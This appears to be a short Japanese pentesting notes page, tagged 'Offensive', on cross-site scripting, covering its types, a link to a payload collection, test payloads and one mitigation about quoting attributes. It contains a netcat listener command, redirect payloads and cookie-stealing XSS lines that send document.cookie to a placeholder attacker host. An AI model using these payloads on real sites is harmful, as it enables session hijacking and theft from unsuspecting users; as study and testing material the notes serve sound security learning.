---
tags:
  - Offensive
---
# クロスサイトスクリプティング(XSS)

自分が入力した内容が誰かに表示されるようなサイトで悪意のあるHTMLを挿入し、クッキー等のデータを盗んだり、強制的にリダイレクトしたりできる。具体的には、入力フィールドや管理者等に送られるデータの中身(リクエストヘッダー)等に仕込む方法がある。

XSSに3つに分類される。
- Reflected XSS
- Stored XSS
- DOM Based XSS

### Reflected XSS

入力フィールドに入力できるときに、GetURLの引数としてペイロードを埋め込んだURLを踏ませることで、クッキー等を盗める。
他にも、入力内容やリクエストヘッダー、POSTリクエストの引数が管理者に送信され、それを見た場合等がある。

### Stored XSS

掲示板等で入力された内容がDBに保存され、永続的に発火することができるタイプ。

## ペイロード

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

### 簡易検証

```html
<b>hoge</b>
```

### 検証用

まず、`nc -lvnp 8000`で待ち受ける。

1. リダイレクト(meta)
	```html
	<meta http-equiv="refresh" content="0;URL=http://<ip>:8000/">
	<script>window.location="http://<ip>:8000/";</script>
	<img src="http://<ip>:8000/"></img>
	```

### クッキー

```html
<img src=x onerror="fetch('http://<ip>:8000/'+document.cookie)"></img>
<script>window.location="http://<ip>:8000/"+document.cookie;</script>
```


## 対策

1. HTMLの属性はダブルクォートで囲む
	```html
	<tag attr=ここに動的に生成>
	```
	このようなHTMLだと、空白を含むペイロードを送ることで、任意の属性を生成してしまう。
	```html
	<tag attr=hoge onmouseover=xss>
	```